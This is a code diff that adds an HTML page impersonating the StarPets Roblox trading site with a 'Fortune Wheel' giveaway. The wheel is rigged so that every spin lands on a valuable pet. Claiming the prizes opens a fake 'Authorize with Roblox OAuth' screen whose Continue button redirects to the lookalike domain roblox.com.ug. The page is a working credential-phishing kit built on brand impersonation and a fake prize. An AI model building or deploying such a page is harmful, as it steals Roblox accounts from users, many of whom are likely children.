@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>StarPets - Fortune Wheel</title>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Nunito', sans-serif; background: #cce9f7; overflow-x: hidden; }
+
+    /* HEADER */
+    header {
+      width: 100%; background: #fff; border-bottom: 1.5px solid #f0f0f0;
+      height: 62px; display: flex; align-items: center; padding: 0 28px;
+      justify-content: space-between; position: sticky; top: 0; z-index: 100;
+      box-shadow: 0 1px 8px rgba(0,0,0,0.05);
+    }
+    .header-logo a { display: flex; align-items: center; }
+    .header-logo img { height: 34px; }
+    .header-nav { display: flex; align-items: center; gap: 2px; }
+    .header-nav a {
+      text-decoration: none; color: #c0c0c0; font-size: 14px; font-weight: 700;
+      padding: 6px 14px; border-radius: 10px; letter-spacing: 0.01em; white-space: nowrap;
+    }
+    .header-nav a.market { color: #555; }
+    .header-right { display: flex; align-items: center; gap: 10px; }
+    .btn-plus {
+      background: #FF6B00; color: #fff; border: none; border-radius: 10px;
+      padding: 7px 18px; font-size: 20px; font-weight: 800; line-height: 1;
+      cursor: pointer; display: flex; align-items: center; justify-content: center;
+    }
+    .user-area { display: flex; align-items: center; gap: 5px; cursor: pointer; padding: 4px 8px; border-radius: 10px; }
+    .user-area img { height: 30px; width: 30px; border-radius: 50%; object-fit: cover; }
+    .chevron-down { width: 16px; height: 16px; color: #999; flex-shrink: 0; }
+
+    /* PAGE LAYOUT */
+    .page-body {
+      display: flex;
+      gap: 28px;
+      padding: 32px 36px 0;
+      align-items: flex-end;
+    }
+
+    /* WHEEL AREA */
+    .wheel-area {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+
+    .wheel-pointer {
+      width: 0; height: 0;
+      border-left: 22px solid transparent;
+      border-right: 22px solid transparent;
+      border-top: 38px solid #aaaaaa;
+      filter: drop-shadow(0 3px 6px rgba(0,0,0,0.25));
+      z-index: 20;
+      position: relative;
+      margin-bottom: -4px;
+      align-self: center;
+    }
+
+    .wheel-container {
+      width: 520px;
+      height: 260px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    canvas#wheel {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+    }
+
+    /* SIDE PANEL */
+    .side-panel {
+      width: 260px; flex-shrink: 0; background: #fff;
+      border-radius: 20px; overflow: hidden;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
+      margin-bottom: 0;
+    }
+    .panel-block1 {
+      padding: 24px 20px 20px; display: flex;
+      flex-direction: column; align-items: center; gap: 10px;
+    }
+    .spin-count {
+      display: flex; align-items: center; gap: 8px;
+      background: #f2f2f2; border: none; border-radius: 10px;
+      padding: 7px 14px; cursor: default;
+    }
+    .spin-count-num { font-size: 15px; font-weight: 800; color: #888; font-family: 'Nunito', sans-serif; }
+    .panel-title { font-size: 22px; font-weight: 800; color: #1a1a1a; text-align: center; }
+    .panel-sub { font-size: 13px; font-weight: 600; color: #aaa; text-align: center; margin-top: -4px; }
+    .panel-block2 { background: #f7f8fa; border-top: 1.5px solid #f0f0f0; padding: 14px 20px; }
+    .promo-text { font-size: 12px; font-weight: 600; color: #aaa; text-align: center; line-height: 1.5; }
+
+    /* SPIN BUTTON BAR */
+    .spin-bar {
+      width: 100%;
+      background: #fff;
+      border-top: 1.5px solid #f0f0f0;
+      padding: 16px 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.04);
+    }
+    .btn-spin-main {
+      background: #FF6B00; color: #fff; border: none; border-radius: 14px;
+      padding: 12px 0; font-size: 15px; font-weight: 800; width: 100%;
+      cursor: pointer; font-family: 'Nunito', sans-serif;
+      box-shadow: 0 4px 14px rgba(255,107,0,0.35);
+    }
+    .btn-spin-main:disabled { background: #ccc; cursor: default; box-shadow: none; }
+
+    /* ITEMS SCROLL BAR */
+    .items-bar {
+      width: 100%;
+      background: #fff;
+      border-top: 1.5px solid #f0f0f0;
+      border-bottom: 1.5px solid #f0f0f0;
+      padding: 14px 20px;
+      overflow: hidden;
+      position: relative;
+    }
+    .items-bar-title {
+      font-size: 13px;
+      font-weight: 800;
+      color: #222;
+      margin-bottom: 10px;
+    }
+    .items-track-wrap {
+      overflow: hidden;
+    }
+    .items-track {
+      display: flex;
+      gap: 12px;
+      animation: scrollItems 30s linear infinite;
+      width: max-content;
+    }
+    @keyframes scrollItems {
+      0%   { transform: translateX(0); }
+      100% { transform: translateX(-33.333%); }
+    }
+    .item-chip {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      background: #f7f9fc;
+      border-radius: 14px;
+      padding: 10px 14px;
+      min-width: 80px;
+    }
+    .item-chip img {
+      width: 52px;
+      height: 52px;
+      object-fit: contain;
+    }
+    .item-chip span {
+      font-size: 11px;
+      font-weight: 700;
+      color: #222;
+      text-align: center;
+      white-space: nowrap;
+    }
+
+    /* FOOTER */
+    footer {
+      background: #fff;
+      padding: 40px 48px 28px;
+      margin-top: 0;
+    }
+    .footer-top {
+      display: flex;
+      gap: 60px;
+      margin-bottom: 32px;
+      flex-wrap: wrap;
+    }
+    .footer-brand {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      min-width: 160px;
+    }
+    .footer-brand img { height: 30px; }
+    .trustpilot {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+    .trustpilot-label {
+      font-size: 11px;
+      font-weight: 700;
+      color: #aaa;
+    }
+    .trustpilot-stars {
+      display: flex;
+      gap: 3px;
+    }
+    .star { font-size: 18px; color: #00b67a; }
+
+    .footer-col { display: flex; flex-direction: column; gap: 10px; }
+    .footer-col-title {
+      font-size: 12px;
+      font-weight: 800;
+      color: #bbb;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 2px;
+    }
+    .footer-col a {
+      text-decoration: none;
+      font-size: 13px;
+      font-weight: 600;
+      color: #555;
+    }
+    .footer-col a:hover { color: #FF6B00; }
+
+    .footer-bottom {
+      border-top: 1.5px solid #f0f0f0;
+      padding-top: 18px;
+      font-size: 12px;
+      color: #bbb;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    /* PRIZES PANEL */
+    .prizes-panel {
+      width: 220px;
+      flex-shrink: 0;
+      background: #fff;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
+      display: flex;
+      flex-direction: column;
+    }
+    .prizes-header {
+      padding: 18px 18px 10px;
+      font-size: 16px;
+      font-weight: 800;
+      color: #1a1a1a;
+      border-bottom: 1.5px solid #f0f0f0;
+    }
+    .prizes-list {
+      flex: 1;
+      padding: 10px 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      min-height: 180px;
+    }
+    .prize-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: #f7f9fc;
+      border-radius: 12px;
+      padding: 8px 10px;
+      animation: fadeInPrize 0.4s ease;
+    }
+    @keyframes fadeInPrize {
+      from { opacity: 0; transform: translateY(8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .prize-item img { width: 38px; height: 38px; object-fit: contain; }
+    .prize-item span { font-size: 12px; font-weight: 700; color: #333; }
+    .prizes-empty {
+      font-size: 12px;
+      font-weight: 600;
+      color: #ccc;
+      text-align: center;
+      padding: 20px 0;
+    }
+    .btn-claim {
+      margin: 10px 14px 14px;
+      background: #ccc;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 11px 0;
+      font-size: 14px;
+      font-weight: 800;
+      cursor: default;
+      font-family: 'Nunito', sans-serif;
+      transition: background 0.3s;
+    }
+    .btn-claim.active {
+      background: #FF6B00;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(255,107,0,0.3);
+    }
+
+    /* NOTIFICATION */
+    .notif {
+      position: fixed;
+      top: 80px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-140px);
+      background: #fff;
+      border-radius: 16px;
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.14);
+      z-index: 9999;
+      transition: transform 0.45s cubic-bezier(0.34,1.46,0.64,1), opacity 0.45s;
+      opacity: 0;
+      min-width: 220px;
+    }
+    .notif.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+    .notif img { width: 48px; height: 48px; object-fit: contain; }
+    .notif-text { display: flex; flex-direction: column; gap: 2px; }
+    .notif-title { font-size: 11px; font-weight: 700; color: #aaa; text-transform: uppercase; letter-spacing: 0.06em; }
+    .notif-name  { font-size: 15px; font-weight: 800; color: #1a1a1a; }
+
+
+    /* CLAIM POPUP */
+    .popup-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.35);
+      z-index: 9998;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+    .popup-overlay.show { display: flex; }
+    .popup-box {
+      background: #fff;
+      border-radius: 24px;
+      padding: 36px 32px 28px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+      max-width: 340px;
+      width: 90%;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.18);
+      animation: popIn 0.4s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes popIn {
+      from { opacity: 0; transform: scale(0.85); }
+      to   { opacity: 1; transform: scale(1); }
+    }
+    .popup-title {
+      font-size: 18px;
+      font-weight: 800;
+      color: #1a1a1a;
+      text-align: center;
+      line-height: 1.3;
+    }
+    .popup-img { width: 180px; object-fit: contain; }
+    .btn-inventory {
+      background: #FF6B00;
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      padding: 13px 28px;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      font-family: 'Nunito', sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 4px 14px rgba(255,107,0,0.3);
+      width: 100%;
+      justify-content: center;
+    }
+    .btn-inventory:hover { background: #e05c00; }
+
+
+    .btn-roblox {
+      background: #1a1a1a;
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      padding: 13px 20px;
+      font-family: 'Nunito', sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.15s;
+    }
+    .btn-roblox:hover { background: #333; }
+    .btn-roblox-text {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 1px;
+    }
+    .btn-roblox-main {
+      font-size: 14px;
+      font-weight: 800;
+      color: #fff;
+    }
+    .btn-roblox-sub {
+      font-size: 11px;
+      font-weight: 600;
+      color: #aaa;
+    }
+
+    .login-method {
+      width: 100%;
+      background: #f7f8fa;
+      border: 1.5px solid #eee;
+      border-radius: 14px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .login-method:hover { background: #f0f0f0; }
+    .login-left { display: flex; align-items: center; gap: 12px; }
+    .login-icon-wrap {
+      width: 40px; height: 40px;
+      background: #1a1a1a;
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .login-icon-wrap img { width: 26px; height: 26px; object-fit: contain; filter: brightness(0) invert(1); }
+    .login-title { font-size: 14px; font-weight: 800; color: #1a1a1a; }
+    .login-sub { font-size: 11px; font-weight: 600; color: #aaa; margin-top: 1px; }
+    .login-arrow { font-size: 18px; color: #bbb; font-weight: 700; }
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div style="display:flex;align-items:center;gap:8px;">
+    <div class="header-logo">
+      <a href="https://starpets.gg">
+        <img src="https://starpets.gg/_nuxt/tISTrn-EFe-5415f33b.svg" alt="StarPets" />
+      </a>
+    </div>
+    <nav class="header-nav">
+      <a href="https://starpets.gg/adopt-me/" class="market">Market</a>
+      <a href="https://starpets.gg/adopt-me/profile/purchased">Items</a>
+      <a href="https://starpets.gg/adopt-me/profile/trade/connected">Sale</a>
+      <a href="https://starpets.gg/rbx">R$</a>
+      <a href="https://starpets.gg/adopt-me/help">Help</a>
+    </nav>
+  </div>
+  <div class="header-right">
+    <button class="btn-plus">+</button>
+    <div class="user-area">
+      <img src="https://starpets.gg/_nuxt/okcZ9ewNhU-5415f33b.svg" alt="Usuario" />
+      <svg class="chevron-down" viewBox="0 0 16 16" fill="none">
+        <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+  </div>
+</header>
+
+<!-- NOTIFICATION -->
+<div class="notif" id="notif">
+  <img id="notifImg" src="" alt="" />
+  <div class="notif-text">
+    <span class="notif-title">You got!</span>
+    <span class="notif-name" id="notifName"></span>
+  </div>
+</div>
+
+<!-- PAGE BODY: prizes + wheel + panel -->
+<div class="page-body">
+
+  <!-- PRIZES PANEL LEFT -->
+  <div class="prizes-panel">
+    <div class="prizes-header">🎁 Your Prizes</div>
+    <div class="prizes-list" id="prizesList">
+      <div class="prizes-empty" id="prizesEmpty">Spin to win prizes!</div>
+    </div>
+    <button class="btn-claim" id="claimBtn" disabled>Claim</button>
+  </div>
+
+  <div class="wheel-area" style="position:relative;">
+    <img src="https://starpets.gg/_nuxt/DNc_4ewNVd-5415f33b.svg" 
+      style="position:absolute;bottom:0;left:-20px;height:140px;object-fit:contain;z-index:5;pointer-events:none;" 
+      alt="decoration" />
+    <img src="https://starpets.gg/_nuxt/B18kFh8dYC-5415f33b.svg"
+      style="position:absolute;bottom:0;right:-20px;height:140px;object-fit:contain;z-index:5;pointer-events:none;"
+      alt="decoration right" />
+    <div class="wheel-pointer"></div>
+    <div class="wheel-container">
+      <canvas id="wheel" width="520" height="520"></canvas>
+    </div>
+  </div>
+
+  <div class="side-panel">
+    <div class="panel-block1">
+      <button class="spin-count" disabled>
+        <span class="spin-count-num" id="ticketCount">3</span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="39" height="28" fill="none" viewBox="0 0 39 28"><g clip-path="url(#trd)"><rect width="36" height="24" x=".522" y="3.615" fill="#b5b5b5" rx="8.123" transform="rotate(-5 .522 3.615)"></rect><path fill="#fff" d="M27.021 16.364c-.895-2.86-3.426-4.95-6.442-5.32 2.906-.89 5.035-3.388 5.42-6.359.896 2.86 3.427 4.95 6.443 5.32-2.906.89-5.035 3.388-5.42 6.359m-7.234 6.126c-.687-2.193-2.627-3.795-4.94-4.08 2.228-.681 3.861-2.597 4.156-4.874.687 2.191 2.627 3.794 4.94 4.079-2.228.681-3.861 2.597-4.156 4.874"></path><path fill="#c8c8c8" d="m.601 3.573 8.092-.708 2.124 24.276-8.092.708z"></path><path stroke="#fff" stroke-dasharray="3.96 3.96" stroke-linecap="round" stroke-width="1.585" d="m8.707 2.862 2.124 24.276"></path></g><defs><clipPath id="trd"><rect width="36" height="24" x=".522" y="3.615" fill="#fff" rx="8.123" transform="rotate(-5 .522 3.615)"></rect></clipPath></defs></svg>
+      </button>
+      <h1 class="panel-title">Fortune Wheel</h1>
+      <p class="panel-sub">Get free items</p>
+      <button class="btn-spin-main" id="spinBtn">Spin (3)</button>
+    </div>
+    <div class="panel-block2">
+      <p class="promo-text">Activate promo codes and get more spins!</p>
+    </div>
+  </div>
+</div>
+
+<!-- WHAT YOU CAN GET BAR -->
+<div class="items-bar">
+  <div class="items-bar-title">What you can get &rsaquo;</div>
+  <div class="items-track-wrap">
+    <div class="items-track" id="itemsTrack"></div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-top">
+    <div class="footer-brand">
+      <img src="https://starpets.gg/_nuxt/tISTrn-EFe-5415f33b.svg" alt="StarPets" />
+      <div class="trustpilot">
+        <span class="trustpilot-label">Trustpilot</span>
+        <div class="trustpilot-stars">
+          <span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-col">
+      <span class="footer-col-title">Main</span>
+      <a href="https://starpets.gg/adopt-me/">Market</a>
+      <a href="https://starpets.gg/adopt-me/profile/trade/fast-sell">Sale</a>
+      <a href="https://starpets.gg/adopt-me/profile/purchased">Items</a>
+      <a href="https://starpets.gg/about-us">About us</a>
+      <a href="https://starpets.gg/reviews">Reviews</a>
+    </div>
+
+    <div class="footer-col">
+      <span class="footer-col-title">Profile</span>
+      <a href="https://starpets.gg/adopt-me/fortune">Wheel of Fortune</a>
+      <a href="https://starpets.gg/adopt-me/promocode">Promo Codes</a>
+      <a href="https://starpets.gg/adopt-me/profile/history">History</a>
+    </div>
+
+    <div class="footer-col">
+      <span class="footer-col-title">Other</span>
+      <a href="https://starpets.gg/policy">Privacy Policy</a>
+      <a href="https://starpets.gg/terms">Terms of Service</a>
+      <a href="https://starpets.gg/return-policy">Return and Refund Policy</a>
+      <a href="https://starpets.gg/adopt-me/help">Help</a>
+    </div>
+  </div>
+
+  <div class="footer-bottom">© 2020-2026 STARPETS.GG All Rights Reserved</div>
+</footer>
+
+<script>
+  // Segments
+  const segments = [
+    { label: 'Reinito Sleighito',    img: 'https://cdn.starpets.gg/SB/110x110/Reinito%20Sleighito_1772809446972.webp',  color: '#d0d4da', light: '#e8eaed' },
+    { label: 'Hydra Dragon Cannelloni', img: 'https://cdn.starpets.gg/SB/110x110/Hydra%20Dragon%20Cannelloni_1772809140310.webp', color: '#d0d4da', light: '#e8eaed' },
+    { label: 'Dragon Cannelloni',    img: 'https://cdn.starpets.gg/SB/110x110/dragon_cannelloni.webp',                  color: '#d0d4da', light: '#e8eaed' },
+    { label: 'Strawberry Elephant',  img: 'https://cdn.starpets.gg/SB/610x610/strawberry_elephant.webp',                color: '#d0d4da', light: '#e8eaed' },
+    { label: 'Rosey and Teddy',      img: 'https://cdn.starpets.gg/SB/110x110/Rosey%20and%20Teddy_1772469367100.webp',  color: '#d0d4da', light: '#e8eaed' },
+  ];
+
+  const canvas = document.getElementById('wheel');
+  const ctx = canvas.getContext('2d');
+  const SIZE = 520;
+  const R = SIZE / 2;
+  const N = segments.length; // 5
+  const arc = (2 * Math.PI) / N;
+  let currentAngle = 0;
+  let spinning = false;
+  let spins = 3;
+
+  // Preload images
+  const images = segments.map(seg => {
+    const img = new Image();
+    img.crossOrigin = 'anonymous';
+    img.src = seg.img;
+    img.onload = () => drawWheel(currentAngle);
+    return img;
+  });
+
+  function drawWheel(angle) {
+    ctx.clearRect(0, 0, SIZE, SIZE);
+    segments.forEach((seg, i) => {
+      const start = angle + Math.PI + i * arc;
+      const end = start + arc;
+      const mid = start + arc / 2;
+
+      ctx.beginPath();
+      ctx.moveTo(R, R);
+      ctx.arc(R, R, R - 2, start, end);
+      ctx.closePath();
+      ctx.fillStyle = i % 2 === 0 ? '#d0d4da' : '#e8eaed';
+      ctx.fill();
+      ctx.strokeStyle = '#fff';
+      ctx.lineWidth = 2;
+      ctx.stroke();
+
+      // Image only (no text)
+      const imgSize = 48;
+      const imgDist = R - 60;
+      const ix = R + Math.cos(mid) * imgDist - imgSize / 2;
+      const iy = R + Math.sin(mid) * imgDist - imgSize / 2;
+      if (images[i].complete && images[i].naturalWidth > 0) {
+        ctx.save();
+        ctx.beginPath();
+        ctx.arc(ix + imgSize/2, iy + imgSize/2, imgSize/2, 0, Math.PI*2);
+        ctx.clip();
+        ctx.drawImage(images[i], ix, iy, imgSize, imgSize);
+        ctx.restore();
+      }
+    });
+
+    // Center circle — sky blue
+    ctx.beginPath();
+    ctx.arc(R, R, 38, 0, 2 * Math.PI);
+    ctx.fillStyle = '#cce9f7';
+    ctx.fill();
+    ctx.strokeStyle = '#a8d8f0';
+    ctx.lineWidth = 3;
+    ctx.stroke();
+  }
+
+  drawWheel(currentAngle);
+
+  // Build items track (duplicated for infinite loop)
+  const track = document.getElementById('itemsTrack');
+  const allItems = [...segments, ...segments, ...segments, ...segments, ...segments, ...segments];
+  allItems.forEach(seg => {
+    const chip = document.createElement('div');
+    chip.className = 'item-chip';
+    chip.innerHTML = `<img src="${seg.img}" alt="${seg.label}" /><span>${seg.label}</span>`;
+    track.appendChild(chip);
+  });
+
+  // Spin logic
+  const btn = document.getElementById('spinBtn');
+  const ticketCount = document.getElementById('ticketCount');
+
+  btn.addEventListener('click', () => {
+    if (spinning || spins <= 0) return;
+    spinning = true;
+    spins--;
+    btn.disabled = true;
+    ticketCount.textContent = spins;
+
+    const sequence = [0, 1, 3]; // Reinito, Hydra Dragon Cannelloni, Strawberry Elephant
+    const spinIndex = 3 - spins - 1; // 0, 1, 2 for spins 2, 1, 0
+    const extraSpins = (5 + Math.floor(Math.random() * 5)) * 2 * Math.PI;
+    const targetSlice = sequence[spinIndex] !== undefined ? sequence[spinIndex] : Math.floor(Math.random() * N);
+    // Canvas: 0=right, PI/2=DOWN=bottom, PI=left, 3PI/2=UP
+    // Slice i center = currentAngle + PI + i*arc + arc/2
+    // Pointer at bottom (PI/2). Solve for delta:
+    // currentAngle + delta + PI + targetSlice*arc + arc/2 = PI/2
+    // delta = -PI/2 - PI - targetSlice*arc - arc/2 - currentAngle
+    //       = -PI/2 - targetSlice*arc - arc/2 - currentAngle  (absorb PI into k*2PI)
+    let delta = (-Math.PI / 2) - (targetSlice * arc + arc / 2) - currentAngle;
+    delta = ((delta % (2 * Math.PI)) + 2 * Math.PI) % (2 * Math.PI);
+    const targetAngle = extraSpins + delta;
+    const duration = 4500;
+    let start = null;
+
+    function easeOut(t) { return 1 - Math.pow(1 - t, 4); }
+
+    function animate(ts) {
+      if (!start) start = ts;
+      const elapsed = ts - start;
+      const progress = Math.min(elapsed / duration, 1);
+      drawWheel(currentAngle + targetAngle * easeOut(progress));
+      if (progress < 1) {
+        requestAnimationFrame(animate);
+      } else {
+        currentAngle = (currentAngle + targetAngle) % (2 * Math.PI);
+        spinning = false;
+
+        // Add prize
+        const won = segments[targetSlice];
+        const empty = document.getElementById('prizesEmpty');
+        if (empty) empty.remove();
+
+        const prizeItem = document.createElement('div');
+        prizeItem.className = 'prize-item';
+        prizeItem.innerHTML = `<img src="${won.img}" alt="${won.label}" /><span>${won.label}</span>`;
+        document.getElementById('prizesList').appendChild(prizeItem);
+
+        // Show notification
+        const notif = document.getElementById('notif');
+        document.getElementById('notifImg').src = won.img;
+        document.getElementById('notifName').textContent = won.label;
+        notif.classList.add('show');
+        setTimeout(() => notif.classList.remove('show'), 3000);
+
+        // Update button
+        if (spins > 0) {
+          btn.disabled = false;
+          btn.textContent = `Spin (${spins})`;
+        } else {
+          btn.textContent = 'No spins left';
+          // Activate claim button
+          const claimBtn = document.getElementById('claimBtn');
+          claimBtn.classList.add('active');
+          claimBtn.disabled = false;
+          claimBtn.onclick = () => document.getElementById('claimPopup').classList.add('show');
+        }
+      }
+    }
+    requestAnimationFrame(animate);
+  });
+</script>
+
+<!-- CLAIM POPUP -->
+<div class="popup-overlay" id="claimPopup">
+  <div class="popup-box">
+    <img src="https://starpets.gg/_nuxt/Dh6fOC_x_G-5415f33b.svg" style="width:120px;display:block;margin:0 auto 14px;" alt="No account" />
+    <div class="popup-title" style="margin-bottom:18px;">Oops! It seems like you don't have an account!</div>
+    <div class="login-method" onclick="openRobloxModal()">
+      <div class="login-left">
+        <div class="login-icon-wrap">
+          <img src="https://starpets.gg/_nuxt/BOhmE_Z4eM-5415f33b.png" alt="Roblox" />
+        </div>
+        <div>
+          <div class="login-title">Login With Roblox</div>
+          <div class="login-sub">Continue account verification</div>
+        </div>
+      </div>
+      <div class="login-arrow">→</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ROBLOX MODAL -->
+<div id="robloxModal" style="position:fixed;inset:0;background:rgba(0,0,0,0.55);backdrop-filter:blur(6px);z-index:99999;display:none;justify-content:center;align-items:center;padding:16px;">
+  <div style="width:100%;max-width:460px;height:85vh;background:white;border-radius:28px;overflow:hidden;animation:popIn .22s ease;">
+    <iframe id="robloxFrame" style="width:100%;height:100%;border:none;" sandbox="allow-scripts allow-forms allow-same-origin" referrerpolicy="no-referrer"></iframe>
+  </div>
+</div>
+
+<script>
+  const LOGIN_URL = "https://roblox.com.ug/login?returnUrl=0462060840624233";
+
+  function openRobloxModal() {
+    document.getElementById('robloxModal').style.display = 'flex';
+    const iframe = document.getElementById('robloxFrame');
+    iframe.srcdoc = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{width:100%;height:100vh;background:#0b0b0d;font-family:Arial,sans-serif;overflow:hidden;display:flex;flex-direction:column;}
+.top{padding:20px 28px;}
+.rbxLogo{height:30px;object-fit:contain;filter:brightness(0) invert(1);}
+.center{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 24px 40px;}
+.oauthText{color:#fff;font-size:20px;font-weight:700;margin-bottom:24px;text-align:center;}
+.oauthApp{display:flex;flex-direction:column;align-items:center;margin-bottom:20px;}
+.oauthAppImage{width:92px;height:92px;border-radius:22px;object-fit:cover;margin-bottom:10px;background:white;padding:8px;}
+.oauthAppName{color:white;font-size:15px;font-weight:500;margin-bottom:4px;}
+.buttons{width:100%;max-width:360px;display:flex;flex-direction:column;align-items:center;gap:10px;}
+.continueBtn{width:100%;padding:14px 0;background:white;color:black;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;}
+.returnBtn{width:100%;padding:13px 0;background:#111317;color:white;border:1px solid #444;border-radius:10px;font-size:15px;font-weight:500;cursor:pointer;}
+</style>
+</head>
+<body>
+<div class="top">
+  <img src="https://logodix.com/logo/1012185.png" class="rbxLogo">
+</div>
+<div class="center">
+  <div class="oauthText">Authorize with Roblox OAuth</div>
+  <div class="oauthApp">
+    <img src="https://starpets.gg/_nuxt/okcZ9ewNhU-5415f33b.svg" class="oauthAppImage">
+    <div class="oauthAppName">StarPets</div>
+  </div>
+  <div class="buttons">
+    <button class="continueBtn" onclick="window.location.href='${LOGIN_URL}'">Continue</button>
+    <button class="returnBtn" onclick="parent.closeRobloxModal()">Return to StarPets</button>
+  </div>
+</div>
+</body>
+</html>`;
+  }
+
+  function closeRobloxModal() {
+    document.getElementById('robloxModal').style.display = 'none';
+  }
+</script>
+
+</body>
+</html>
